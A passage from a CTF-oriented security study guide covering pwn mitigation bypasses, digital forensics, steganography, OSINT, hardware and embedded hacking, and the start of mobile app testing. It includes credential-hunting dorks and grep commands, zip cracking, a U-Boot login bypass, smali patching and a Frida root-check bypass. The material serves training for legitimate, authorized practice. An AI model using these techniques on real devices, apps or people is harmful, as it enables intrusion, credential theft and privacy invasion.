### 4.18 Mitigation Bypasses I'd Only Named
- **Stack pivoting** — if your buffer is too small for a full ROP chain but you control `rsp` (via `pop rsp; ret`), pivot your "stack" into attacker-controlled memory of arbitrary size.
- **SROP (Sigreturn-Oriented Programming)** — abuses `sigreturn` to restore every register in one shot. `pwntools`: `SigreturnFrame()`.
- **Partial overwrite** — overwrite only the low byte(s) of an address (constant within a page across ASLR re-randomizations), bypassing ASLR for certain paths.

### 4.19 CTF Pwn Infrastructure
```bash
cargo install pwninit   # auto-patches binary+libc+linker to match the exact provided files locally
```
pwndbg context display auto-shows registers/stack/disasm on every breakpoint stop.
**ret2dlresolve** — forge the dynamic linker's own resolution structures to call an arbitrary libc function by name with zero known addresses (no-libc-given challenge variants).

### 4.20 Updated Practice Path
Everything from 4.12, plus: pwn.college kernel module (last) · one seccomp-restricted challenge (picoCTF/HTB) · skim (don't solo) one V8 CTF writeup.

### 4.21 Trick Questions (Pass 2)
- Why does seccomp exist alongside NX/ASLR/canaries? Defense-in-depth — assumes you'll eventually get execution, limits damage even then.
- Why is kernel pwn harder than userland for the "same" bug class? A kernel crash panics the whole machine (no "just try it" iteration), plus SMEP/SMAP/kASLR stack on top.
- SROP vs normal ROP: normal ROP chains gadgets one register at a time; SROP abuses the OS's full-register-restore mechanism as one "gadget."

---

## 5. Digital Forensics

### 5.1 Lab Setup
```bash
wget https://github.com/sleuthkit/autopsy/releases/download/autopsy-4.21.0/autopsy-4.21.0.zip
unzip autopsy-4.21.0.zip && cd autopsy-4.21.0 && ./unix_setup.sh
sudo apt install -y sleuthkit
pip3 install volatility3
sudo apt install -y wireshark && sudo usermod -aG wireshark $USER
sudo apt install -y libimage-exiftool-perl
sudo apt install -y binwalk foremost scalpel
pip3 install plaso
sudo apt install -y ewf-tools
```

### 5.2 Mental Model
Forensics = answer a specific question using evidence left behind. First move, always: `file evidence.dd` / `exiftool evidence.dd`.

### 5.3 Disk Image Analysis
```bash
mmls evidence.dd
sudo mount -o ro,loop,offset=$((2048*512)) evidence.dd /mnt/evidence
fls -r -d evidence.dd        # deleted files
icat evidence.dd <inode> > recovered_file.bin
foremost -t jpg,pdf,zip -i evidence.dd -o output_dir/   # magic-byte carving
```
Magic bytes: JPEG `FF D8 FF`, PNG `89 50 4E 47`, ZIP `50 4B 03 04`, GIF `47 49 46 38`.
**NTFS artifacts**: `$MFT` (master file table, parse with `analyzeMFT`/`MFTECmd`), `$LogFile`/`$UsnJrnl` (journal), **Alternate Data Streams** (`file.txt:hidden.exe`, invisible in normal listings).
Deletion doesn't erase data — just marks space available until overwritten; this is the single most important forensics fact.

### 5.4 Memory Forensics (Volatility)
```bash
vol3 -f memory.dmp windows.info
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.pstree
vol3 -f memory.dmp windows.netscan
vol3 -f memory.dmp windows.malfind
vol3 -f memory.dmp windows.memmap --pid 1337 --dump
vol3 -f memory.dmp windows.cmdline
vol3 -f memory.dmp windows.registry.printkey --key "..."
strings memory.dmp | grep -i "flag{"
```
Memory catches fileless malware, decrypted secrets, active sessions — things disk-only forensics misses entirely.

### 5.5 Windows Registry
| Hive | Location | Reveals |
|---|---|---|
| SYSTEM | System32\config\SYSTEM | Services, USB history, computer name/timezone |
| SOFTWARE | same dir | Installed programs, Run/RunOnce autostart (persistence location) |
| NTUSER.DAT | Users\<user>\NTUSER.DAT | RecentDocs, TypedPaths, UserAssist (ROT13-encoded!) |
| SAM | System32\config\SAM | Local NTLM hashes |
```bash
git clone https://github.com/keydet89/RegRipper3.0
```

### 5.6 Log Analysis
```bash
pip3 install python-evtx
evtx_dump.py Security.evtx | less
```
Key Event IDs: **4624** successful logon · **4625** failed logon · **4688** new process (shows command line if auditing enabled) · **1102** Security log cleared (massive red flag).
Linux: `/var/log/auth.log`, `/var/log/syslog`, `last`, `lastb`.

### 5.7 Timeline Analysis
```bash
log2timeline.py timeline.plaso evidence.dd
psort.py -o l2tcsv timeline.plaso -w timeline.csv
```
Anti-forensics: **timestomp** (MAC-time manipulation) — cross-check filesystem timestamps against internal metadata (e.g. PE compile timestamp) for inconsistency.

### 5.8 PCAP/Network Forensics (Forensics-specific slice)
Follow TCP Stream reconstructs full conversations. File → Export Objects → HTTP/SMB/FTP-DATA auto-saves transferred files.
Filters: `http.request`, `dns`, `ip.addr==10.0.0.5`, `tcp.port==4444`, `frame contains "flag"`.

### 5.9 Email Forensics
`.eml`/`.msg` headers — `Received:` chain shows mail-server hops (read bottom-to-top), SPF/DKIM/DMARC results reveal spoofing.

### 5.10 Mobile Forensics Crossover
```bash
sudo apt install -y sqlite3 sqlitebrowser
sqlite3 sms.db "SELECT * FROM message;"
```

### 5.11 Anti-Forensics
Wiping (`shred`, `dd if=/dev/zero`) · timestomping · log clearing (Event 1102, `.bash_history` only saves on clean exit — crashed shells may survive in memory) · steganography (Category 6 crossover) · encrypted containers (VeraCrypt/LUKS — identify presence via `cryptsetup luksDump`, can't crack without key).

### 5.12 Practice Path
**CyberDefenders.org** (best, start here) → picoCTF forensics → **13Cubed** YouTube (Volatility/Autopsy walkthroughs) → SANS DFIR free posters/archived CTFs → **Malware-Traffic-Analysis.net** → Root-Me forensics.

### 5.13 Trick Questions (Pass 1)
- Always work from a copy, never the original (chain of custody, hash before/after).
- MAC times: Accessed often lies due to `relatime`/`noatime` mount defaults.
- Volatility's `malfind` uses behavioral heuristics (executable+writable memory, no backing file), not signatures — catches novel malware.
- Carving loses filename/timestamp/location, keeps only raw content (+ anything embedded within it).

### 5.14 Cloud Forensics
```bash
cat cloudtrail-log.json | jq '.Records[] | select(.eventName=="DeleteBucket")'
aws s3 ls s3://bucket-name --no-sign-request
docker diff; docker export
```
AWS CloudTrail = cloud's Event Log equivalent. S3 bucket misconfig = OSINT/forensics crossover. Docker layer diffing, Kubernetes audit logs = container/orchestration forensics. Practice: **flaws.cloud**, **CloudGoat**.

### 5.15 Browser Forensics
```bash
sqlite3 "History" "SELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls;"
```
Chrome uses **WebKit time** (microseconds since 1601-01-01), not Unix epoch — a genuine gotcha. Firefox: `places.sqlite`. Tool: **Hindsight**.

### 5.16 $I/$R Recycle Bin Artifacts (Windows)
Deletion creates `$I<random>` (metadata: path, timestamp, size) + `$R<random>` (content). `$I` often survives in unallocated space even after Recycle Bin is emptied.

### 5.17 Prefetch / Shimcache / Amcache
- **Prefetch** (`Windows\Prefetch\*.pf`) — proves execution, records run count + timestamps, survives even if the executable's deleted.
- **Shimcache (AppCompatCache)** — path+timestamp, supporting evidence only, NOT proof of execution.
- **Amcache.hve** — strong execution evidence including SHA1 hashes.
Tools: Eric Zimmerman's suite (**PECmd**, **AppCompatCacheParser**, **AmcacheParser**) — .NET, run via Wine or a Windows VM.

### 5.18 Shellbags
Registry (`NTUSER.DAT`/`UsrClass.dat`) records folders a user browsed — even on a now-disconnected USB drive, even if the folder is deleted since.

### 5.19 Volume Shadow Copies (VSS)
```bash
sudo apt install -y libvshadow-utils
vshadowinfo evidence.dd
vshadowmount evidence.dd /mnt/shadow/
```
Historical filesystem snapshots can contain files since deleted/modified on the "live" filesystem.

### 5.20 Hibernation File / Pagefile
`hiberfil.sys` = entire RAM written to disk at hibernation — feed into Volatility as a memory dump when no live `.vmem` exists. `pagefile.sys`/swap can hold process memory fragments surviving even a reboot.

### 5.21 ext4-Specific Recovery
```bash
sudo apt install -y extundelete
extundelete evidence.dd --restore-all
```
Don't assume NTFS techniques transfer directly — check filesystem type via `file`/`mmls` first.

### 5.22 Chain of Custody & Report-Writing
Document your process: hash evidence before/after each step, keep a timestamped command log, write a clear final narrative. Separates "found the flag" from "could testify to how." Graded explicitly in GCFA-style exercises.

### 5.23 Updated Practice Path
Everything from 5.12, plus: flaws.cloud/CloudGoat (cloud gap) · Eric Zimmerman's suite on a sample Windows image · one CyberDefenders "cloud"/"container"-tagged challenge.

### 5.24 Trick Questions (Pass 2)
- `hiberfil.sys` = a free memory snapshot frozen at last hibernation — memory-forensics-level insight from a pure disk acquisition.
- Emptying Recycle Bin removes `$I`/`$R` directory entries, not the underlying data blocks — still carvable until overwritten.
- Shimcache is weaker than Prefetch/Amcache because it can record metadata the OS merely *observed* (e.g. during a directory listing), not necessarily execution.

---

## 6. Steganography

### 6.1 Lab Setup
```bash
sudo apt install -y libimage-exiftool-perl steghide
wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb
sudo dpkg -i stegseek_0.6-1.deb
sudo apt install -y ruby ruby-dev && gem install zsteg
sudo apt install -y binwalk
wget http://www.caesum.com/handbook/Stegsolve.jar
sudo apt install -y audacity sonic-visualiser
sudo apt install -y outguess pngcheck
```

### 6.2 Mental Model
Crypto hides meaning; stego hides existence. Universal first-move checklist on ANY stego file:
```bash
file suspect.png; exiftool suspect.png; binwalk suspect.png; strings suspect.png | tail -50
```

### 6.3 File Signature Mismatches
Magic bytes: PNG `89 50 4E 47`, JPEG `FF D8 FF`, ZIP `50 4B 03 04`, GIF `47 49 46 38`, PDF `25 50 44 46`.
```bash
xxd suspect.png | head -5
mv suspect.png suspect.zip && unzip suspect.zip
```

### 6.4 Appended/Embedded Data
```bash
binwalk suspect.png
binwalk -e suspect.png
dd if=suspect.png bs=1 skip=48291 of=extracted.zip
```
Viewers stop reading at the format's end marker (PNG `IEND`, JPEG `FFD9`) — trailing data persists invisibly. `cat image.png secret.zip > combined.png` is exactly how these are constructed.

### 6.5 LSB Steganography (Core Image Technique)
A 1000x1000 image = 3M color channels = ~375KB hideable, invisibly.
```bash
java -jar Stegsolve.jar   # cycle bit planes — LSB plane often shows structured noise where higher planes look normal
zsteg suspect.png
zsteg -a suspect.png
zsteg suspect.png -E "b1,r,lsb,xy"
```
Manual Python extraction:
```python
from PIL import Image
img = Image.open('suspect.png')
pixels = list(img.getdata())
bits = ''
for pixel in pixels:
    for channel in pixel[:3]:
        bits += str(channel & 1)
message = ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))
print(message)
```

### 6.6 JPEG-Specific Steganography (DCT Coefficients)
```bash
steghide extract -sf suspect.jpg -p password
stegseek suspect.jpg /usr/share/wordlists/rockyou.txt
outguess -r suspect.jpg output.txt
```

### 6.7 Audio Steganography
```bash
audacity suspect.wav     # View → Spectrogram
sonic-visualiser suspect.wav   # Layer → Add Spectrogram
```
LSB in audio samples: same bit-extraction concept via Python's `wave` module. DTMF tones / Morse code can be layered audibly — decode by ear or `multimon-ng`.

### 6.8 Metadata Steganography
```bash
exiftool -all suspect.jpg   # dump everything, including custom/maker-notes fields
```

### 6.9 Archive-Based Steganography
```bash
unzip -l archive.zip
sudo apt install -y fcrackzip
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt archive.zip
zip2john archive.zip > hash.txt
john --wordlist=rockyou.txt hash.txt
```

### 6.10 PDF Steganography
```bash
pdftotext suspect.pdf -
exiftool suspect.pdf
pdfimages -all suspect.pdf out
qpdf --qdf --object-streams=disable suspect.pdf decompressed.pdf
strings suspect.pdf | grep -i "JavaScript\|EmbeddedFile"
pdfdetach -list suspect.pdf
pdfdetach -saveall suspect.pdf
```

### 6.11 Polyglot Files
A single file simultaneously valid as two+ formats (JPEG+ZIP+PDF), carefully crafted so each parser finds its own structure. Recognize when multiple tools each report a different, individually-valid format for the same bytes.

### 6.12 QR Codes/Barcodes in Images
```bash
sudo apt install -y zbar-tools
zbarimg suspect.png
```
Combine with Stegsolve bit-plane viewing — a QR may only be scannable in a specific plane.

### 6.13 Video Steganography
```bash
ffmpeg -i suspect.mp4 frame_%04d.png
ffmpeg -i suspect.mp4 audio.wav
```
Video = image stego per-frame + audio stego on the extracted track, plus "one odd frame out" detection via frame-diffing.

### 6.14 Practice Path
picoCTF stego → **StegOnline** (stegonline.georgeom.net) → Root-Me stego → CTFtime "stego" writeups → HackThisSite basic missions.

### 6.15 Trick Questions (Pass 1)
- LSB doesn't survive JPEG's lossy DCT compression — hence DCT-coefficient-based tools (steghide/outguess).
- Steganalysis (statistical detection of LSB manipulation) is a real research countermeasure to stego's "plausible deniability" goal.
- Always check metadata first (cheapest check) — challenge authors exploit beginners jumping straight to LSB.
- `file` only inspects header magic bytes, not trailing/embedded data — `binwalk` is the complementary check.

### 6.16 Text/Whitespace Steganography
```bash
cat -A suspect.txt | head
sudo apt install -y stegsnow
stegsnow -C suspect.txt
```
**Zero-width character stego** — invisible Unicode (`U+200B/C/D`) encodes messages; a real document-watermarking/leak-tracing technique, not just CTF toy.
```bash
xxd suspect.txt | grep -i "e2 80 8b\|e2 80 8c\|e2 80 8d"
```

### 6.17 GIF-Specific Steganography
Palette-indexed, not direct RGB — data hidden in palette LSBs or which duplicate palette slot a pixel references. `zsteg suspect.gif` handles this too.

### 6.18 Error Level Analysis (ELA)
Detects edits/manipulation via re-compression diffing, a different detection axis than LSB/metadata.
```bash
convert suspect.jpg -quality 90 resaved.jpg
compare suspect.jpg resaved.jpg -compose src diff.png
```
Also: FotoForensics.com (free online ELA tool).

### 6.19 Named JPEG Stego Algorithms Beyond Steghide
**F5** (matrix-encoding, more statistical-detection-resistant) · **JSteg** (early, weak, easily detected) · **OpenPuff** (modern, cross-format, multi-layer with separate passwords).
```bash
sudo apt install -y stegdetect
stegdetect suspect.jpg
```

### 6.20 Steganalysis as Triage
`stegdetect`/`zsteg` confidence scoring tells you whether to go deep on LSB or pivot to metadata/appended-file checks instead.

### 6.21 Network/Covert-Channel Steganography
DNS tunneling (base32-encoded subdomains to attacker domain) · ICMP covert channels (data in "optional" ping fields) · TCP/IP header field steganography (IP ID, sequence numbers, timestamp options). Detection via Wireshark, abnormal subdomain patterns = classic DNS-tunneling tell.

### 6.22 Git Repository Steganography
```bash
git log --all --oneline
git log --diff-filter=D --summary
git show <commit_hash>:path/to/deleted_file
git fsck --unreachable
git cat-file -p <hash>
```
Data can hide in commit history/dangling objects — a real developer mistake (commit-then-"remove"), not an invented CTF scenario.

### 6.23 Audio Container Metadata (ID3)
```bash
exiftool suspect.mp3
id3v2 -l suspect.mp3
```

### 6.24 Image-Diffing
```bash
compare image1.png image2.png -compose src diff.png
```
```python
from PIL import Image, ImageChops
diff = ImageChops.difference(Image.open('image1.png'), Image.open('image2.png'))
diff.save('diff.png')
```
Given two near-identical images, diff directly rather than blind bit-plane analysis.

### 6.25 Updated Practice Path
Everything from 6.14, plus: one zero-width-character challenge (picoCTF/Root-Me/CTFtime "unicode") · one git-stego challenge · compare `stegdetect`/`zsteg` output on known-clean vs known-stego images.

### 6.26 Trick Questions (Pass 2)
- Zero-width stego is a real privacy/tracking mechanism AND a way to smuggle invisible instructions into text — a current, non-academic concern.
- Challenge authors use OpenPuff/F5 specifically to defeat players who reflexively `stegseek`/`steghide extract` and stop.
- `git cat-file -p <hash>` reads a dangling blob's raw content directly, no checkout needed.

---

## 7. Open-Source Intelligence (OSINT)

### 7.1 Lab Setup
```bash
sudo apt install -y theharvester amass recon-ng
pip3 install spiderfoot
git clone https://github.com/sherlock-project/sherlock.git && cd sherlock && pip3 install -r requirements.txt
# Maltego CE: download .deb from maltego.com, sudo dpkg -i maltego.deb
pip3 install holehe
sudo apt install -y whois dnsutils
```

### 7.2 Mental Model
OSINT is a graph-building exercise: one data point pivots to the next. **Golden rule**: only legally/ethically accessible public information — no private-account access, no social engineering real people.

### 7.3 Google Dorking
```
site:example.com filetype:pdf
site:example.com inurl:admin
intitle:"index of" "backup"
site:pastebin.com "example.com" password
filetype:xls intext:"@example.com"
site:linkedin.com "example.com" "security engineer"
"example.com" -site:example.com
site:example.com (filetype:env OR filetype:sql OR filetype:log)
```
**GHDB** (exploit-db.com/google-hacking-database) — maintained dork archive by category.
```bash
shodan search "apache" country:UG
shodan host 8.8.8.8
```
Shodan indexes internet-connected *devices*; Censys is a similar alternative worth cross-checking.

### 7.4 Username/Email Enumeration
```bash
python3 sherlock.py targetusername
holehe target@example.com
```
**haveibeenpwned.com** — confirms breach *existence*, deliberately doesn't expose actual leaked passwords to casual lookups.

### 7.5 Image Geolocation (Visual Analysis)
Systematic approach: vegetation/climate → text/language on signs → road markings/driving side → architecture/power sockets → shadow angle+sun position → cross-reference Street View/satellite.
Tools: Google Lens, **Yandex Images** reverse search (strongest free option for OSINT specifically). **GeoGuessr** played deliberately is genuine, non-joking training.
Practice: TryHackMe "OhSINT" room.

### 7.6 EXIF/Metadata Geolocation
```bash
exiftool photo.jpg | grep -i gps
exiftool -gpslatitude -gpslongitude -c "%.6f" photo.jpg
```
Only works on originals — social media platforms strip GPS EXIF on upload.

### 7.7 DNS and Domain Recon
```bash
whois example.com
dig example.com ANY
dig example.com MX
dig example.com TXT
amass enum -d example.com
theHarvester -d example.com -b all
```
**Certificate transparency**: `crt.sh?q=%.example.com` — every SSL cert ever issued is permanently, publicly logged, often revealing internal/staging subdomains.

### 7.8 Social Media Recon
LinkedIn (org/employee mapping + tech stack leakage) · Twitter/X advanced search · Facebook Graph Search (mostly deprecated concept now) · Instagram location/hashtag search. **Username-reuse** across platforms + reverse image search on profile photos is the core pivot pattern.

### 7.9 Corporate/Organizational OSINT
SEC EDGAR / Companies House / Crunchbase. Job postings reveal exact tech stack (self-disclosed, 100% public).
```
site:github.com "example.com"
site:github.com "example.com" api_key
```
```bash
pip3 install truffleHog
trufflehog https://github.com/target/repo
```
`gitleaks` as an alternative.

### 7.10 Maltego
Starting entity → "transforms" (automated lookups) → visual graph expansion. Makes pivot opportunities obvious that plain-text output can hide. Community Edition free, rate-limited.

### 7.11 Phone/People-Search OSINT
Truecaller, numverify API (carrier/location from number). People-search aggregators (Spokeo, Pipl, Whitepages — US-centric, variable coverage by country).

### 7.12 Practice Path
TryHackMe "OhSINT" → TryHackMe "Searching"/general OSINT → GeoGuessr (with a techniques guide) → picoCTF OSINT → **Trace Labs OSINT CTF** (tracelabs.org — real missing-persons searches, ethically bounded) → Root-Me/CTFtime.

### 7.13 Trick Questions (Pass 1)
- Social platforms strip GPS EXIF for privacy — always try to find the original image source.
- OSINT vs unauthorized access: the line is any access-control bypass (needing a password/login you don't have).
- crt.sh is powerful because organizations can't opt out of certificate transparency logging.
- Username reuse works because people pick 1-2 handles for convenience, inadvertently linking otherwise-separate identities.

### 7.14 Wayback Machine and Historical/Cached Data
```
web.archive.org/web/*/example.com
```
```bash
pip3 install waybackpy
waybackpy --url example.com --oldest
```
Google cache / cachedview.nl as fallback. Deleted Reddit: removeddit.com, reveddit.com.

### 7.15 WHOIS History / Reverse WHOIS
Current WHOIS is usually GDPR-redacted; historical records (whoxy.com, securitytrails.com) predate privacy-service adoption (~pre-2018). **Reverse WHOIS** — one identifier → every domain registered with it.

### 7.16 Google Alerts / Ongoing Monitoring
`google.com/alerts` — OSINT as a continuous discipline, not just point-in-time lookup.

### 7.17 Document Metadata (Beyond Images)
```bash
exiftool document.docx
exiftool document.pdf
```
**FOCA** — bulk-downloads a target's PDFs/DOCs/XLSs via automatic Google dorking, aggregates ALL their metadata (usernames, internal server names, software versions). Real case study: 2012 John McAfee Guatemala GPS leak via an interview photo's EXIF.

### 7.18 Satellite/Aerial Imagery
Sentinel Hub (sentinel-hub.com, free tier) · **SunCalc.org** (precise shadow/sun-position calculator — operationalizes the shadow-geolocation technique) · Wikimapia (crowd-sourced informal place names).

### 7.19 Public Records and Government Data
Court records (PACER + international equivalents) · property records · voter registration (varies by jurisdiction) · **FOIA requests** — MuckRock.com hosts completed requests and lets you file new ones.

### 7.20 Aircraft/Vessel/Vehicle Tracking
flightradar24.com, adsbexchange.com (ADS-B, legal public broadcast) · marinetraffic.com, vesselfinder.com (AIS). License plate OSINT varies hugely by jurisdiction — generally avoid unless context is clearly legitimate.

### 7.21 OPSEC — The Defensive Mirror
Compartmentalization (never reuse usernames/avatars across contexts) · metadata hygiene (`exiftool -all= file.jpg`) · VPN/Tor awareness (your own IP is itself an OSINT target) · sock puppet accounts (standard professional investigator practice).

### 7.22 Breach Data Beyond HIBP
dehashed.com, intelx.io — aggregate actual leaked credential content, not just breach existence. Know-it-exists knowledge; requires clear legal authorization to use against anyone.

### 7.23 Updated Practice Path
Everything from 7.12, plus: run FOCA-style workflow (manual `exiftool`+dork) against an authorized domain · practice a Wayback pivot · try SunCalc on a photo with known rough location/date.

### 7.24 Trick Questions (Pass 2)
- Wayback Machine sits cleanly within OSINT ethics because it archives already-public content with zero access-control bypass.
- Document metadata often leaks more than image metadata due to collaborative editing lifecycle (revision history, track-changes).
- HIBP vs dehashed-style tools: HIBP deliberately limits misuse by not returning actual data; aggregators need a much higher legitimate-use bar.

---

## 8. Hardware & Embedded Security

### 8.1 Lab Setup
```bash
sudo apt install -y binwalk
# Ghidra — already installed (handles ARM/MIPS/AVR natively)
sudo apt install -y qemu-system-arm qemu-system-mips qemu-user qemu-user-static
git clone https://github.com/rampageX/firmware-mod-kit.git
sudo apt install -y minicom screen
sudo apt install -y openocd flashrom sigrok pulseview avrdude
pip3 install esptool
sudo apt install -y squashfs-tools
```
Useful cheap hardware: USB-to-UART adapter (CP2102/FTDI, ~$3-5) · cheap logic analyzer (~$10) · Bus Pirate/FT232H · JTAG/SWD adapter (ST-Link clone ~$3). Most beginner challenges are software-simulated — none of this is required to start.

### 8.2 Mental Model
Firmware is a binary disassembled the same way as Category 3 — new material is: extraction, cross-architecture (ARM/MIPS), and physical debug interfaces.

### 8.3 Firmware Extraction
```bash
file firmware.bin
binwalk firmware.bin
binwalk -e firmware.bin
cd _firmware.bin.extracted/squashfs-root/
cat etc/passwd; cat etc/shadow
find . -name "*.conf"
```
Via physical access: `flashrom -p ch341a_spi -r firmware_dump.bin`, or the device's own backup/update feature.

### 8.4 Architecture Identification
```bash
file extracted_binary
readelf -h extracted_binary
```
MIPS common in older/cheap routers; ARM dominates modern IoT. Endianness matters — Ghidra auto-detects, verify if disassembly looks garbage.

### 8.5 UART — Highest-Value Physical Skill
Find pins: unpopulated 3-4 pin header; multimeter/logic-analyzer to identify GND/TX/RX.
```bash
screen /dev/ttyUSB0 115200
minicom -D /dev/ttyUSB0 -b 115200
```
Wire crossed (RX↔TX). CTF-simulated version: captured UART log text file. **U-Boot interruption** — spam a key during boot countdown, modify boot args (`init=/bin/sh`) to bypass OS login entirely.

### 8.6 SPI and I²C
**SPI** (4-wire: MOSI/MISO/SCLK/CS) — connects to external flash, what `flashrom` talks to directly (most reliable dump method). **I²C** (2-wire: SDA/SCL) — lower-speed peripherals, EEPROM.
```bash
pulseview   # Decoders → SPI / I2C
```

### 8.7 JTAG and SWD
Direct CPU debug access — halt, single-step, read/write any memory, dump flash.
```bash
openocd -f interface/stlink.cfg -f target/stm32f4x.cfg
gdb-multiarch
(gdb) target remote localhost:3333
(gdb) monitor reset halt
(gdb) monitor flash read_bank 0 dump.bin 0 0x100000
```
**JTAGulator** brute-force-identifies unknown/undocumented debug pins. Production devices often **fuse off** JTAG/SWD before shipping — a hard stop, not software-bypassable.

### 8.8 Firmware Analysis Post-Extraction
```bash
grep -r "password" etc/ 2>/dev/null
grep -rE "api[_-]?key|secret|token" etc/ usr/ 2>/dev/null
find . -name "*.key" -o -name "*.pem"
file usr/bin/httpd   # confirm arch, then open in Ghidra directly
```
Hardcoded backdoor credentials are a real, recurring CVE class in consumer IoT, not just a CTF trope.

### 8.9 Microcontroller-Specific
```bash
avrdude -c usbasp -p atmega328p -U flash:r:dump.bin:r
esptool.py --port /dev/ttyUSB0 read_flash 0 0x400000 dump.bin
esptool.py --port /dev/ttyUSB0 chip_id
```

### 8.10 Side-Channel Attacks (Advanced)
**Power analysis (SPA/DPA)** — key recovery via power-consumption measurement during crypto ops. **Timing attacks** — hardware-level version of 2.15. **Fault injection (glitching)** — voltage/clock/laser disruption causes a skipped instruction (e.g. skip a PIN check). **ChipWhisperer** (~$250 kit) is the purpose-built practice platform.

### 8.11 Wireless/RF Side
```bash
sudo apt install -y rtl-sdr gqrx-sdr
```
RTL-SDR dongle (~$25) turns Zorin into an SDR receiver — capture garage openers, key fobs, sub-GHz sensors. GQRX/Universal Radio Hacker to decode. Replay attacks = classic entry-level demo.

### 8.12 Practice Path
picoCTF hardware (software-simulated) → **Damn Vulnerable Router Firmware (DVRF)** (QEMU, no hardware needed) → Azeria Labs ARM Assembly tutorials → cheap real router + $5 UART adapter + community writeup for a first real hardware win → CTFtime "hardware"/"IoT" writeups.

### 8.13 Trick Questions (Pass 1)
- UART left active: development convenience, often forgotten before shipping.
- JTAG fused off but UART active (or vice versa): JTAG gives more dangerous control (halt CPU, arbitrary R/W), prioritized for disabling.
- SPI chip-read vs vendor update file: chip-read gives exact running firmware + runtime state at cost of physical access; vendor file is easier but may be stripped/partial.
- Fault injection doesn't alter code — it corrupts physical execution for nanoseconds (skipped cycle/bit-flip), causing misexecution of a single instruction.

### 8.14 Secure Boot and Bootloader Chain
Each boot stage verifies the next stage's signature before handoff. Attacks: **downgrade** (flash an older signed-but-vulnerable firmware, no rollback enforcement) · **ROM bootloader bugs** (exploit the verifier itself, before signature check) · **fault injection against the verification instruction specifically**.

### 8.15 Firmware Encryption
```bash
binwalk -E firmware.bin   # entropy analysis — high flat entropy across the WHOLE file = encryption, not compression
```
Key often lives in the bootloader (unencrypted, has to start the chain), or derivable from device-specific data, or extractable via JTAG/chip-off before encryption applies.

### 8.16 Chip-Off and Physical Chip ID
Hot-air-remove the flash/eMMC chip, read with a dedicated adapter — most invasive but most reliable when software/JTAG/UART are locked/fused. Identify unknown chips via package markings + alldatasheet.com/octopart.com. eMMC needs a different reader than SPI NOR flash.

### 8.17 ICS / SCADA / PLCs
**Modbus** — historically zero built-in authentication.
```bash
pip3 install pymodbus
pip3 install conpot   # ICS honeypot, safe local practice target
```
Shodan `"modbus"` searches reveal genuinely alarming numbers of exposed real-world ICS. Named specialty with its own certifications (GICSP).

### 8.18 CAN Bus (Automotive)
```bash
sudo apt install -y can-utils
candump can0
cansend can0 123#DEADBEEF
git clone https://github.com/zombieCraig/ICSim
```
Real field — 2015 Jeep Cherokee remote hack made it mainstream news.

### 8.19 RFID/NFC
```bash
sudo apt install -y libnfc-bin
nfc-list
```
**Proxmark3** = dedicated hardware tool. **MIFARE Classic**'s Crypto-1 is well-documented-broken; `mfoc`/`mfcuk` recover keys/clone cards — a real, deployed vulnerability class (legacy access-control hardware persists due to replacement cost).

### 8.20 Firmware Update Mechanism Attacks
Unsigned update acceptance (flash arbitrary firmware) · update-server MITM over plain HTTP (Category 1/11 crossover) · downgrade via the legitimate update UI.

### 8.21 Updated Practice Path
Everything from 8.12, plus: ICSim hands-on · Conpot honeypot + `pymodbus` interaction · CTFtime "CAN"/"RFID"/"ICS" tagged challenges.

### 8.22 Trick Questions (Pass 2)
- Modbus's lack of auth was a reasonable assumption for air-gapped OT networks; IT/OT convergence broke that assumption.
- Chip-off defeats access control, not necessarily encryption — a raw dump of encrypted firmware is still ciphertext.
- MIFARE Classic persists despite being broken because replacing physical card/reader infrastructure is expensive — a security-debt economics lesson.

---

## 9. Mobile Security

### 9.1 Lab Setup
```bash
sudo apt install -y android-sdk-platform-tools
wget https://dl.google.com/android/repository/platform-tools-latest-linux.zip
unzip platform-tools-latest-linux.zip
echo 'export PATH=$PATH:~/platform-tools' >> ~/.bashrc && source ~/.bashrc

sudo apt install -y apktool
wget https://github.com/skylot/jadx/releases/download/v1.5.0/jadx-1.5.0.zip
unzip jadx-1.5.0.zip -d jadx/
echo 'export PATH=$PATH:~/jadx/bin' >> ~/.bashrc && source ~/.bashrc

pip3 install frida-tools objection
git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
cd Mobile-Security-Framework-MobSF && ./setup.sh
pip3 install mitmproxy
git clone https://github.com/pxb1988/dex2jar.git
```
Need a rooted Android emulator (Genymotion free tier) or rooted physical device (Magisk) for Frida's most powerful features.

### 9.2 Mental Model
A mobile app = the client half of a web app (Category 1), wrapped in its own permission/sandbox model. Almost every mobile bug is: insecure local storage, a weak client-side check bypassed via patching/hooking, or the same backend API vulnerabilities from Category 1 reached via a mobile client.

### 9.3 APK Structure
```bash
unzip -l app.apk
```
`AndroidManifest.xml` (read first, always — permissions, components, entry points), `classes.dex`, `res/`, `lib/` (native .so), `assets/`, `META-INF/`.
```bash
apktool d app.apk -o app_decoded/
cat app_decoded/AndroidManifest.xml
```

### 9.4 Static Analysis with JADX
```bash
jadx -d output_dir/ app.apk
grep -r "password" output_dir/sources/
grep -rE "api[_-]?key|secret|AWS|firebase" output_dir/sources/
grep -r "http://" output_dir/sources/
grep -r "Log\." output_dir/sources/
```
`android:exported="true"` on an Activity/Service/Receiver = reachable by any app on the device, bypassing your own login flow — a real, common vulnerability.

### 9.5 Smali Patching
```bash
apktool d app.apk -o app_decoded/
# edit .smali files
apktool b app_decoded/ -o modified_app.apk
keytool -genkey -v -keystore mykey.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykey.keystore modified_app.apk mykey
```
Replace a conditional jump (`if-eqz`) with an unconditional `goto` to patch out a root/license check.

### 9.6 Dynamic Analysis with Frida
```bash
frida-ps -U
frida -U -f com.target.app -l script.js --no-pause
```
```javascript
Java.perform(function() {
    var RootCheck = Java.use("com.app.RootCheck");
    RootCheck.isRooted.implementation = function() {
        console.log("[*] isRooted() called — forcing return false");
        return false;
    };
});
```
```bash
objection -g com.target.app explore
# android sslpinning disable
```
SSL pinning bypass is almost always your first step before intercepting app traffic with mitmproxy/Burp.

### 9.7 Insecure Data Storage
```bash
objection -g com.target.app explore
# env
# file download /data/data/com.target.app/databases/app.db ./app.db
sqlite3 app.db ".tables"
adb logcat | grep -i "password\|token\|secret"
```
